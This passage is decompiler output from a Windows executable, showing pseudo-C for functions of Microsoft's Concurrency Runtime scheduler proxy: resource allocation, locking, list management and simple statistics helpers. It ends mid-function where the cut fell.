//----- (0047A37F) --------------------------------------------------------
double __thiscall sub_47A37F(double *this)
{
  int v2; // [esp+4h] [ebp-4h]

  v2 = *((_DWORD *)this + 4);
  if ( v2 )
    return *this / (double)v2;
  else
    return 0.0;
}

//----- (0047A39F) --------------------------------------------------------
unsigned int __thiscall sub_47A39F(int this, unsigned int a2)
{
  _DWORD *v3; // esi
  unsigned int v4; // ebx
  unsigned int v5; // eax
  unsigned int v6; // edi
  unsigned int v7; // esi
  unsigned int v8; // ecx

  v3 = *(_DWORD **)(this + 2048);
  v4 = v3[46] + sub_472427(v3);
  v5 = sub_4707A1(v3);
  v6 = *(_DWORD *)(this + 2068);
  v7 = a2;
  v8 = *(_DWORD *)(this + 2064);
  if ( v8 + v6 < a2 )
    v7 = v8 + v6;
  if ( v6 > v8 && v6 - v8 > v7 )
    v7 = v6 - v8;
  if ( v7 == v6 )
  {
    if ( v7 <= v4 )
      ++v7;
    else
      --v7;
  }
  if ( v4 > v7 )
    v7 = v4;
  if ( v5 < v7 )
    v7 = v5;
  if ( v7 != v6 && sub_47A053(v7 - v6) == -1 )
  {
    while ( --v6 == v7 || sub_47A053(v7 - v6) == -1 )
    {
      if ( *((int *)sub_47A30B((char *)this, v6) + 4) > 0
        && sub_47A18E((char *)this, *(_DWORD *)(this + 2068), v6) * -1.0 <= 0.0 )
      {
        return v6 + 1;
      }
    }
  }
  return v7;
}

//----- (0047A46F) --------------------------------------------------------
unsigned int __thiscall sub_47A46F(int this, unsigned int a2, unsigned int a3, int a4, unsigned int a5)
{
  unsigned int result; // eax
  int v7; // edi
  unsigned int v8; // ecx
  int v9; // edx
  unsigned int v10; // eax
  int v11; // esi
  _DWORD *v12; // esi
  unsigned int v13; // edi
  unsigned int v14; // eax
  unsigned int v15; // esi
  int v16; // edi
  double *v17; // esi
  double v18; // st7
  unsigned __int64 v19; // rax
  double v20; // [esp+18h] [ebp-Ch]
  double v21; // [esp+18h] [ebp-Ch]
  char *v22; // [esp+20h] [ebp-4h]

  if ( !a2 )
    return 0;
  ++*(_DWORD *)(this + 2084);
  sub_47A280(this, a2);
  v7 = *(_DWORD *)(this + 2088);
  v8 = a3;
  v9 = a4;
  if ( v7 )
  {
    v8 = *(_DWORD *)(this + 2092) + a3;
    v9 = *(_DWORD *)(this + 2096) + a4;
  }
  if ( v8 < a2 && v8 < a5 )
  {
    v10 = a2 - v8;
    v8 = a2;
    v9 += v10;
  }
  v11 = *(_DWORD *)(this + 2080);
  if ( !v11 || v8 || v9 || a5 )
  {
    v14 = v7 + 1;
    v15 = v11 + 1;
    *(_DWORD *)(this + 2080) = v15;
    *(_DWORD *)(this + 2092) = 0;
    *(_DWORD *)(this + 2096) = 0;
    *(_DWORD *)(this + 2088) = 0;
    v16 = *(_DWORD *)(this + 2068);
    v20 = sub_47A153(v14, v8, v9, a5);
    if ( v15 <= 1 )
    {
      *(_DWORD *)(this + 2072) = v16;
      return v16;
    }
    v17 = (double *)sub_47A30B((char *)this, v16);
    v22 = sub_47A30B((char *)this, *(_DWORD *)(this + 2072));
    sub_47A130(v17, v20, *(_DWORD *)(this + 2084));
    if ( !*((_DWORD *)v22 + 4) || v17 == (double *)v22 )
    {
      if ( !sub_47A34F((int)v17) )
        return v16;
      LODWORD(v19) = *(_DWORD *)(this + 2068) + sub_47A336((_BYTE *)this);
    }
    else
    {
      if ( !sub_47A34F((int)v17) )
        return v16;
      v18 = sub_47A18E((char *)this, *(_DWORD *)(this + 2072), *(_DWORD *)(this + 2068)) * *(double *)(this + 2056);
      v21 = (double)*(unsigned int *)(this + 2068);
      v19 = (unsigned __int64)(v21 + v18);
      if ( (_DWORD)v19 == *(_DWORD *)(this + 2068) )
        v19 = (unsigned __int64)(sub_47A06B(v18) + v21);
    }
    return sub_47A39F(this, v19);
  }
  v12 = *(_DWORD **)(this + 2048);
  v13 = v7 + 1;
  *(_DWORD *)(this + 2092) = 0;
  *(_DWORD *)(this + 2088) = v13;
  *(_DWORD *)(this + 2096) = 0;
  result = v12[46] + sub_472427(v12);
  if ( v13 < 3 )
    return *(_DWORD *)(this + 2068);
  return result;
}

//----- (0047A62F) --------------------------------------------------------
double __thiscall sub_47A62F(double *this)
{
  int v1; // eax
  double result; // st7
  long double v3; // st6

  v1 = *((_DWORD *)this + 4);
  result = 0.0;
  v3 = 0.0;
  if ( v1 >= 2 )
    v3 = (this[1] - *this * *this / (double)v1) / (double)(v1 - 1);
  if ( fabs(v3) > 0.0001 )
    return v3;
  return result;
}

//----- (0047A67B) --------------------------------------------------------
char *__thiscall sub_47A67B(char *this, int a2, int a3, _DWORD *a4)
{
  int v5; // eax
  bool v6; // zf
  HANDLE CurrentThread; // eax
  unsigned int v8; // eax
  unsigned int v9; // ecx
  unsigned int v10; // edi
  unsigned int v11; // esi
  unsigned int v12; // eax
  unsigned int v13; // esi
  int v14; // eax
  int v15; // ecx
  unsigned int v16; // eax
  unsigned int v17; // edi
  unsigned int v18; // eax
  int v19; // ecx
  unsigned int v20; // esi
  unsigned int v21; // ecx
  volatile signed __int32 *v22; // ecx
  void *v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  unsigned int v27; // ecx
  unsigned int v29; // [esp+14h] [ebp-14h]
  unsigned int v30; // [esp+18h] [ebp-10h]

  *((_DWORD *)this + 1) = 0;
  *(_DWORD *)this = &Concurrency::details::SchedulerProxy::`vftable';
  *((_DWORD *)this + 3) = a3;
  sub_46ED40((struct _RTL_CRITICAL_SECTION *)(this + 32));
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 39) = 0;
  *((_DWORD *)this + 40) = 0;
  *((_DWORD *)this + 42) = 0;
  *((_DWORD *)this + 43) = 0;
  *((_DWORD *)this + 44) = 0;
  *((_DWORD *)this + 45) = 0;
  *((_DWORD *)this + 46) = 0;
  *((_DWORD *)this + 49) = 0;
  *((_DWORD *)this + 50) = 0;
  *((_DWORD *)this + 2) = a2;
  *((_DWORD *)this + 35) = sub_479B05(a4, 1u);
  *((_DWORD *)this + 34) = sub_479B05(a4, 2u);
  *((_DWORD *)this + 36) = sub_479B05(a4, 3u);
  *((_DWORD *)this + 37) = sub_479B05(a4, 5u);
  *((_DWORD *)this + 38) = sub_479B05(a4, 6u);
  v5 = sub_479B05(a4, 8u);
  v6 = *((_DWORD *)this + 38) == 61440;
  this[204] = v5 == 1;
  if ( v6 )
  {
    CurrentThread = GetCurrentThread();
    *((_DWORD *)this + 38) = (char)sub_46F7BC(CurrentThread);
  }
  *((_DWORD *)this + 31) = (***((int (__thiscall ****)(_DWORD))this + 2))(*((_DWORD *)this + 2));
  v8 = sub_471AC7();
  v9 = *((_DWORD *)this + 35);
  v10 = v8;
  v11 = *((_DWORD *)this + 36);
  v30 = v8;
  *((_DWORD *)this + 47) = v8;
  v12 = (v8 + v9 - 1) / v8;
  if ( v11 >= v12 )
  {
    v13 = (v9 + v11 - 1) / v11;
    *((_DWORD *)this + 32) = v13;
  }
  else
  {
    *((_DWORD *)this + 36) = v12;
    v13 = v10;
    *((_DWORD *)this + 32) = v10;
  }
  v14 = v9 / v13;
  v29 = v9 / v13;
  if ( v9 % v13 )
  {
    v17 = (v13 + v9 - 1) / v13;
    v18 = *((_DWORD *)this + 34);
    *((_DWORD *)this + 36) = v17;
    v19 = *((_DWORD *)this + 35) + v13 * (1 - v17);
    v20 = v13 - v19;
    *((_DWORD *)this + 41) = v19;
    v21 = v20 * (v17 - 1);
    if ( v21 < v18 )
      v16 = v20 + (v17 + v18 - v21 - 1) / v17;
    else
      v16 = (v17 + v18 - 2) / (v17 - 1);
    v10 = v30;
  }
  else
  {
    v15 = *((_DWORD *)this + 34) - 1;
    *((_DWORD *)this + 36) = v14;
    *((_DWORD *)this + 41) = v13;
    v16 = (v15 + v14) / v29;
  }
  v22 = (volatile signed __int32 *)*((_DWORD *)this + 3);
  *((_DWORD *)this + 33) = v16;
  sub_472E4B(v22);
  if ( this[204] )
  {
    v23 = operator new(0x838u);
    if ( v23 )
      v24 = sub_47A0A3((int)v23, *((_DWORD *)this + 31), v10, (int)this);
    else
      v24 = 0;
    *((_DWORD *)this + 14) = v24;
  }
  v25 = sub_471D13();
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 48) = v25;
  v26 = unknown_libname_28((unsigned __int64)(unsigned int)v25 >> 30 != 0 ? -1 : 4 * v25);
  v27 = 0;
  for ( *((_DWORD *)this + 5) = v26; v27 < *((_DWORD *)this + 48); ++v27 )
    *(_DWORD *)(*((_DWORD *)this + 5) + 4 * v27) = v27;
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 471D13: using guessed type int sub_471D13(void);
// 4C0E2C: using guessed type void *Concurrency::details::SchedulerProxy::`vftable';

//----- (0047A8D7) --------------------------------------------------------
void __thiscall sub_47A8D7(char *this)
{
  _DWORD *v2; // ecx
  void **v3; // [esp-4h] [ebp-18h]

  v3 = (void **)*((_DWORD *)this + 4);
  v2 = (_DWORD *)*((_DWORD *)this + 3);
  *(_DWORD *)this = &Concurrency::details::SchedulerProxy::`vftable';
  sub_4707BA(v2, v3);
  j_j_j___free_base(*((void **)this + 5));
  sub_472E99(*((_DWORD *)this + 3));
  sub_46EDCA((LPCRITICAL_SECTION)(this + 32));
}
// 4C0E2C: using guessed type void *Concurrency::details::SchedulerProxy::`vftable';

//----- (0047A934) --------------------------------------------------------
void __thiscall sub_47A934(_DWORD *this, int a2, int a3, char a4)
{
  int v5; // eax
  unsigned int v6; // ebx
  _DWORD *v7; // eax
  char *v8; // esi
  int v9; // eax
  int v10; // ecx
  char v11; // [esp+Ch] [ebp-Ch] BYREF
  int v12; // [esp+10h] [ebp-8h]
  char *v13; // [esp+14h] [ebp-4h]

  v5 = this[41];
  v6 = this[36];
  if ( v5 )
    this[41] = v5 - 1;
  else
    --v6;
  ++*(_DWORD *)(a2 + 28);
  ++this[40];
  v7 = (_DWORD *)(*(_DWORD *)(a2 + 48) + 52 * a3);
  *v7 = 4;
  v7[9] = v6;
  this[44] += v6;
  if ( a4 )
    sub_47B789(this, a2, a3);
  if ( v6 == 1 )
  {
    v13 = &v11;
    goto LABEL_9;
  }
  v8 = (char *)unknown_libname_28((unsigned __int64)v6 >> 30 != 0 ? -1 : 4 * v6);
  v13 = v8;
  if ( v6 )
  {
LABEL_9:
    v12 = 0;
    do
    {
      v9 = (*(int (__thiscall **)(_DWORD *, int, int))(*this + 24))(this, a2, a3);
      v10 = v12;
      v8 = v13;
      *(_DWORD *)&v13[4 * v12] = v9;
      v12 = v10 + 1;
    }
    while ( v10 + 1 < v6 );
  }
  sub_47AA95((int)this, (int)v8, v6);
  if ( v8 != &v11 )
    j_j_j___free_base(v8);
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (0047A9FF) --------------------------------------------------------
void __thiscall sub_47A9FF(int this, int a2)
{
  struct _RTL_CRITICAL_SECTION *v2; // esi

  v2 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_46F04D((LPCRITICAL_SECTION)(this + 32));
  sub_47AA4D(
    (_DWORD *)(*(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + *(_DWORD *)(this + 16) + 48) + 52 * *(_DWORD *)(a2 + 40) + 12),
    a2);
  sub_46F193(v2);
}

//----- (0047AA4D) --------------------------------------------------------
int __thiscall sub_47AA4D(_DWORD *this, int a2)
{
  int result; // eax

  result = this[1];
  if ( result )
  {
    *(_DWORD *)(a2 + 56) = *(_DWORD *)(result + 56);
    *(_DWORD *)(a2 + 52) = this[1];
    *(_DWORD *)(*(_DWORD *)(this[1] + 56) + 52) = a2;
    result = this[1];
    *(_DWORD *)(result + 56) = a2;
  }
  else
  {
    *(_DWORD *)(a2 + 56) = a2;
    *(_DWORD *)(a2 + 52) = a2;
  }
  ++*this;
  this[1] = a2;
  return result;
}

//----- (0047AA86) --------------------------------------------------------
int __thiscall sub_47AA86(_DWORD *this, int a2)
{
  return sub_47AA4D(this + 49, a2);
}

//----- (0047AA95) --------------------------------------------------------
void __thiscall sub_47AA95(int this, int a2, unsigned int a3)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  unsigned int v4; // eax
  int v5; // ebx
  int v6; // eax
  struct _RTL_CRITICAL_SECTION *v7; // [esp+10h] [ebp-18h]
  unsigned int v8; // [esp+14h] [ebp-14h]

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  v7 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_46F04D((LPCRITICAL_SECTION)(this + 32));
  v4 = 0;
  v8 = 0;
  if ( a3 )
  {
    do
    {
      v5 = *(_DWORD *)(a2 + 4 * v4);
      v6 = (**(int (__thiscall ***)(int))v5)(v5);
      sub_47AA4D(
        (_DWORD *)(*(_DWORD *)(52 * v6 + *(_DWORD *)(this + 16) + 48) + 12 + 52 * *(_DWORD *)(v5 + 48)),
        v5 + 8);
      v4 = v8 + 1;
      v8 = v4;
    }
    while ( v4 < a3 );
    v3 = v7;
  }
  (*(void (__thiscall **)(_DWORD, int, unsigned int))(**(_DWORD **)(this + 8) + 12))(*(_DWORD *)(this + 8), a2, a3);
  *(_DWORD *)(this + 156) += a3;
  sub_46F193(v3);
}

//----- (0047AB43) --------------------------------------------------------
unsigned int __thiscall sub_47AB43(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // ecx
  unsigned int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // esi
  int v7; // ebx
  unsigned __int64 v8; // rax
  unsigned int v9; // esi

  v3 = 0;
  v4 = this[35];
  v5 = this[39];
  if ( v4 > v5 )
  {
    v6 = this[36];
    v7 = this[41];
    v8 = v4 - v5;
    if ( v7 * v6 < (unsigned int)v8 )
    {
      LODWORD(v8) = v8 - v7 * v6;
      v3 = v7 + v8 / (v6 - 1);
    }
    else
    {
      v3 = (unsigned int)v8 / v6;
    }
  }
  v9 = v3 + this[40];
  if ( v9 >= sub_4707A1(this) )
    v9 = sub_4707A1(this);
  if ( v9 >= a2 )
    return a2;
  return v9;
}

//----- (0047ABB3) --------------------------------------------------------
int __thiscall sub_47ABB3(void *this, int a2)
{
  int result; // eax
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_46A08B(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  result = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
  if ( !result )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 28))(this, a2);
  return result;
}

//----- (0047AC0F) --------------------------------------------------------
void __thiscall sub_47AC0F(_DWORD *this)
{
  _DWORD *v1; // eax
  unsigned int v2; // edx
  int v3; // ebx
  unsigned int v4; // esi
  int v5; // ecx
  int v6; // edx
  int v7; // ebx
  int v8; // ebx
  int v9; // edi
  int v10; // edi
  int v12; // [esp+4h] [ebp-14h]
  unsigned int v13; // [esp+8h] [ebp-10h]
  unsigned int v14; // [esp+Ch] [ebp-Ch]
  int v15; // [esp+10h] [ebp-8h]
  int v16; // [esp+14h] [ebp-4h]

  v1 = this;
  v2 = 0;
  v13 = 0;
  if ( this[48] )
  {
    v3 = 0;
    v12 = 0;
    do
    {
      v4 = 0;
      v5 = v3 + v1[4];
      v14 = 0;
      v15 = v5;
      if ( *(_DWORD *)(v5 + 4) )
      {
        v6 = 0;
        v16 = 0;
        do
        {
          v7 = *(_DWORD *)(*(_DWORD *)(v5 + 48) + v6 + 16);
          if ( v7 )
            v8 = *(_DWORD *)(v7 + 56);
          else
            v8 = 0;
          if ( v8 )
          {
            do
            {
              v9 = v8;
              if ( v8 == *(_DWORD *)(*(_DWORD *)(v5 + 48) + v6 + 16) )
                v8 = 0;
              else
                v8 = *(_DWORD *)(v8 + 56);
              v10 = *(_DWORD *)(v9 + 28);
              sub_4814C3(v10);
              (*(void (__thiscall **)(int))(*(_DWORD *)v10 + 36))(v10);
              v5 = v15;
              v6 = v16;
            }
            while ( v8 );
            v4 = v14;
          }
          ++v4;
          v6 += 52;
          v14 = v4;
          v16 = v6;
        }
        while ( v4 < *(_DWORD *)(v5 + 4) );
        v1 = this;
        v2 = v13;
        v3 = v12;
      }
      ++v2;
      v3 += 52;
      v13 = v2;
      v12 = v3;
    }
    while ( v2 < v1[48] );
  }
  sub_46C87D((void *)v1[14]);
}

//----- (0047ACDC) --------------------------------------------------------
_DWORD *__thiscall sub_47ACDC(void *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi

  v4 = operator new(0x3Cu);
  v5 = 0;
  if ( v4 )
    v5 = sub_479DBF(v4, (int)this, a2, a3);
  sub_479EED((int)v5);
  return v5;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0047AD23) --------------------------------------------------------
int __thiscall sub_47AD23(char *this, int a2)
{
  int v3; // ebx
  struct _RTL_CRITICAL_SECTION *v4; // esi
  int v5; // ecx
  int v6; // eax
  int v7; // ebx
  int v8; // ecx
  int (__thiscall *v9)(char *, int, int); // edi
  int v10; // eax
  int v11; // ecx
  int v12; // edi
  char pExceptionObject[12]; // [esp+10h] [ebp-24h] BYREF
  char *v15; // [esp+1Ch] [ebp-18h]
  int v16; // [esp+20h] [ebp-14h]
  char *v17; // [esp+24h] [ebp-10h]
  int v18; // [esp+30h] [ebp-4h]

  v17 = this;
  v3 = __RTDynamicCast(
         a2,
         0,
         &Concurrency::IExecutionResource `RTTI Type Descriptor',
         &Concurrency::details::ExecutionResource `RTTI Type Descriptor',
         0);
  if ( !v3 )
  {
    v3 = a2 + 8;
    if ( *(char **)(a2 + 28) != this )
    {
      sub_46A08B(pExceptionObject, (int)"pExecutionResource");
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
    }
  }
  v4 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  v15 = this + 32;
  sub_46F04D((LPCRITICAL_SECTION)(this + 32));
  v5 = 52 * *(_DWORD *)(v3 + 36);
  v6 = *(_DWORD *)this;
  v7 = *(_DWORD *)(v3 + 40);
  v18 = 0;
  v8 = *((_DWORD *)this + 4) + v5;
  v9 = *(int (__thiscall **)(char *, int, int))(v6 + 24);
  v16 = v8;
  v10 = v9(v17, v8, v7);
  v11 = v16;
  v12 = v10;
  *(_BYTE *)(v10 + 69) = 1;
  sub_47AA4D((_DWORD *)(52 * v7 + *(_DWORD *)(v11 + 48) + 12), v10 + 8);
  v18 = 1;
  sub_46F193(v4);
  return v12;
}
// 484C5C: using guessed type _DWORD __cdecl __RTDynamicCast(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0047ADDF) --------------------------------------------------------
_DWORD *__thiscall sub_47ADDF(void *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax

  v4 = operator new(0x58u);
  result = 0;
  if ( v4 )
    return sub_4814F3(v4, (int)this, a2, a3);
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0047AE17) --------------------------------------------------------
unsigned int __thiscall sub_47AE17(_DWORD *this, int a2)
{
  unsigned int result; // eax
  int v3; // edx

  result = *(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + this[4] + 48);
  if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(result + 52 * *(_DWORD *)(a2 + 40) + 24), 0xFFFFFFFF) )
  {
    v3 = this[3];
    result = this[32] == this[33];
    if ( *(_DWORD *)(v3 + 16) > result )
      return SetEvent(*(HANDLE *)(v3 + 80));
  }
  return result;
}

//----- (0047AE61) --------------------------------------------------------
char __thiscall sub_47AE61(_DWORD *this, int a2, int a3, char a4)
{
  int v4; // ebx
  int v6; // ecx
  int v7; // eax
  int v8; // edi

  v4 = 52 * a2;
  v6 = 52 * a3;
  v7 = this[4];
  v8 = 52 * a3 + *(_DWORD *)(v7 + 52 * a2 + 48);
  if ( a4 )
  {
    --*(_DWORD *)(v8 + 44);
    --this[45];
  }
  if ( (*(_DWORD *)(v8 + 40))-- == 1 )
  {
    v7 = v4 + this[4];
    --this[43];
    --*(_DWORD *)(v7 + 36);
    if ( *(_BYTE *)(v8 + 50) )
    {
      LOBYTE(v7) = sub_47B789(this, v7, a3);
      v6 = 52 * a3;
      *(_BYTE *)(v8 + 50) = 0;
    }
    if ( a4 )
    {
      v7 = *(_DWORD *)(this[4] + v4 + 48);
      if ( !*(_DWORD *)(v7 + v6 + 36) )
        --this[46];
    }
  }
  return v7;
}

//----- (0047AEDA) --------------------------------------------------------
void __thiscall sub_47AEDA(char *this)
{
  if ( this )
  {
    sub_47A8D7(this);
    sub_46C87D(this);
  }
}

//----- (0047AEF5) --------------------------------------------------------
void __thiscall sub_47AEF5(int this, _DWORD *a2)
{
  int v2; // edx
  _DWORD *v3; // ebx
  int v4; // edx
  int v5; // edx
  struct _RTL_CRITICAL_SECTION *v6; // esi

  v2 = *(_DWORD *)(this + 16) + 52 * a2[9];
  v3 = (_DWORD *)(*(_DWORD *)(v2 + 48) + 52 * a2[10]);
  if ( !(v3[9] + v3[11]) )
  {
    --*(_DWORD *)(v2 + 28);
    *v3 = 1;
    v4 = *(_DWORD *)(this + 12);
    --*(_DWORD *)(this + 160);
    v5 = *(_DWORD *)(*(_DWORD *)(v4 + 72) + 40 * a2[9] + 32) + 36 * a2[10];
    --*(_DWORD *)(v5 + 16);
  }
  v6 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_46F04D((LPCRITICAL_SECTION)(this + 32));
  sub_47B532(v3 + 3, (int)a2);
  sub_46F193(v6);
  *a2 = &Concurrency::details::ExecutionResource::`vftable';
  sub_46C87D(a2);
}
// 4C0DF4: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (0047AF7A) --------------------------------------------------------
int __thiscall sub_47AF7A(int this, int a2)
{
  struct _RTL_CRITICAL_SECTION *v2; // esi
  int v3; // eax

  v2 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_46F04D((LPCRITICAL_SECTION)(this + 32));
  v3 = (**(int (__thiscall ***)(int))a2)(a2);
  sub_47B532((_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 16) + 52 * v3 + 48) + 52 * *(_DWORD *)(a2 + 48) + 12), a2 + 8);
  if ( !*(_BYTE *)(a2 + 69) )
    --*(_DWORD *)(this + 156);
  sub_46F193(v2);
  return (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 36))(a2);
}

//----- (0047B004) --------------------------------------------------------
int __thiscall sub_47B004(_DWORD *this)
{
  sub_47AC0F(this);
  return (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
}

//----- (0047B021) --------------------------------------------------------
LPVOID __thiscall sub_47B021(_DWORD *this)
{
  int v1; // esi
  LPVOID v2; // eax

  v1 = 0;
  v2 = sub_46F930(*(_DWORD *)(this[3] + 112));
  if ( v2 && ((unsigned __int8)v2 & 3) == 0 )
    return v2;
  return (LPVOID)v1;
}

//----- (0047B03E) --------------------------------------------------------
_DWORD *__thiscall sub_47B03E(_DWORD *this, int a2)
{
  int (__thiscall ***v3)(_DWORD, _DWORD, _DWORD); // ebx
  _DWORD *v4; // esi

  v3 = (int (__thiscall ***)(_DWORD, _DWORD, _DWORD))this[1];
  if ( !v3 )
  {
    v3 = (int (__thiscall ***)(_DWORD, _DWORD, _DWORD))sub_47BB2D((char *)(this[3] + 104));
    this[1] = v3;
  }
  v4 = (_DWORD *)(**v3)(v3, this[37], this[38]);
  sub_48190A(v4, a2);
  return v4;
}

//----- (0047B08E) --------------------------------------------------------
_DWORD *__thiscall sub_47B08E(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi

  if ( (void *)a2[5] == this )
    return a2;
  v3 = operator new(0x3Cu);
  v4 = 0;
  if ( v3 )
    v4 = sub_479E1D(v3, (int)this, a2);
  sub_479EED((int)v4);
  return v4;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0047B0DC) --------------------------------------------------------
_DWORD *__thiscall sub_47B0DC(int this, unsigned int a2, int a3, char a4)
{
  int v4; // ebx
  unsigned int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // esi
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // edx
  unsigned int v13; // esi
  unsigned int v14; // eax
  char v15; // cl
  _DWORD *v16; // edx
  unsigned int v17; // ecx
  _DWORD *v18; // esi
  char v19; // al
  char v20; // cl
  int v21; // eax
  int v22; // ecx
  int v23; // ebx
  unsigned int v24; // eax
  unsigned int v26; // [esp+Ch] [ebp-40h]
  _DWORD *v27; // [esp+10h] [ebp-3Ch]
  int v28; // [esp+14h] [ebp-38h]
  int v29; // [esp+18h] [ebp-34h]
  unsigned int v30; // [esp+1Ch] [ebp-30h]
  _DWORD *Block; // [esp+20h] [ebp-2Ch]
  unsigned int v32; // [esp+24h] [ebp-28h]
  int i; // [esp+28h] [ebp-24h]
  int j; // [esp+2Ch] [ebp-20h]
  int v35; // [esp+30h] [ebp-1Ch]
  int v36; // [esp+34h] [ebp-18h]
  unsigned int v37; // [esp+38h] [ebp-14h]
  int v38; // [esp+3Ch] [ebp-10h]
  _DWORD *v39; // [esp+40h] [ebp-Ch]
  unsigned int v40; // [esp+44h] [ebp-8h]
  char v41; // [esp+49h] [ebp-3h]
  char v42; // [esp+4Ah] [ebp-2h]
  char v43; // [esp+4Bh] [ebp-1h]

  v4 = 0;
  v37 = 0;
  if ( a4 )
  {
    v6 = sub_472427((_DWORD *)this);
    v7 = a2;
    v8 = *(_DWORD *)(this + 184) + v6 < a2 + *(_DWORD *)(this + 160);
  }
  else
  {
    v7 = a2;
    v8 = 0;
  }
  v30 = v8;
  v9 = v8 < v7 ? v7 - v8 : 0;
  if ( !v8 || (v41 = 1, v7) )
    v41 = 0;
  if ( !a4 || (v42 = 1, v8) )
    v42 = 0;
  v39 = 0;
  v26 = -1;
  v38 = -1;
  if ( a4 )
    v36 = sub_471B12(*(_DWORD **)(this + 12), 0);
  else
    v36 = -1;
  v32 = 0;
  if ( v9
    && ((v10 = *(_DWORD *)(this + 164), v11 = *(_DWORD *)(this + 144), v9 > v10)
      ? (v12 = v11 * v10 + (v11 - 1) * (v9 - v10))
      : (v12 = v9 * v11),
        (v32 = v12) != 0) )
  {
    Block = (_DWORD *)unknown_libname_28((unsigned __int64)(unsigned int)v12 >> 30 != 0 ? -1 : 4 * v12);
  }
  else
  {
    Block = 0;
  }
  v13 = 0;
  v14 = a2;
  v15 = a4 ^ 1;
  v28 = 0;
  v43 = a4 ^ 1;
  for ( i = 0; ; i += 52 )
  {
    v40 = v13;
    if ( v37 >= v14 )
    {
      if ( v15 )
        break;
    }
    if ( v13 >= *(_DWORD *)(this + 192) )
      break;
    v16 = (_DWORD *)(i + *(_DWORD *)(this + 16));
    v27 = v16;
    if ( v16[6] || v16[7] )
    {
      v17 = 0;
      for ( j = 0; ; j += 52 )
      {
        v35 = v17;
        if ( v37 >= v14 && v43 || v17 >= v16[1] )
        {
          v15 = v43;
          v16[6] = 0;
          goto LABEL_65;
        }
        v18 = (_DWORD *)(j + v16[12]);
        if ( *v18 == 3 )
          break;
        if ( *v18 != 4 )
          goto LABEL_50;
        if ( v42 )
        {
          v24 = v18[9] + v18[11];
          if ( v24 < v26 || v24 == v26 && v40 == v36 )
          {
            v26 = v18[9] + v18[11];
            v39 = v16;
            v38 = v17;
          }
          goto LABEL_49;
        }
        if ( !v41 || v18[10] )
          goto LABEL_50;
        v13 = v40;
        if ( !v39 || v40 == v36 )
        {
          v14 = a2;
          v39 = v16;
          v38 = v17;
          if ( v40 == v36 )
            v43 = 1;
        }
LABEL_51:
        ++v17;
      }
      if ( !v43 && (v37 == v14 - 1 || v36 == v40) )
      {
        v19 = 1;
        if ( v30 )
        {
          v20 = 0;
LABEL_38:
          *v18 = 4;
          ++v16[7];
          ++*(_DWORD *)(this + 160);
          if ( v19 )
          {
            v39 = v16;
            v38 = v35;
            v43 = 1;
          }
          if ( v20 )
          {
            v21 = *(_DWORD *)(this + 164);
            v22 = *(_DWORD *)(this + 144);
            v29 = v22;
            if ( v21 )
              *(_DWORD *)(this + 164) = v21 - 1;
            else
              v29 = --v22;
            v18[9] += v22;
            *(_DWORD *)(this + 176) += v22;
            if ( v22 )
            {
              v23 = v29;
              do
              {
                Block[v28++] = (*(int (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)this + 24))(this, v16, v35);
                v16 = v27;
                --v23;
              }
              while ( v23 );
              v4 = 0;
            }
          }
          ++v37;
          v17 = v35;
LABEL_49:
          v14 = a2;
LABEL_50:
          v13 = v40;
          goto LABEL_51;
        }
      }
      else
      {
        v19 = 0;
      }
      v20 = 1;
      goto LABEL_38;
    }
LABEL_65:
    ++v13;
  }
  if ( v32 )
  {
    sub_47AA95(this, (int)Block, v32);
    j_j_j___free_base(Block);
  }
  if ( a4 )
  {
    if ( !v42 && v41 )
    {
      sub_47B568((_DWORD *)this, (int)v39, v38);
      *(_DWORD *)(52 * v38 + v39[12]) = 4;
      ++v39[7];
      ++*(_DWORD *)(this + 160);
    }
    return sub_47ACDC((void *)this, v39, v38);
  }
  return (_DWORD *)v4;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (0047B3B5) --------------------------------------------------------
unsigned __int32 __thiscall sub_47B3B5(_DWORD *this, int a2)
{
  unsigned __int32 result; // eax
  int v3; // edx

  result = _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + this[4] + 48)
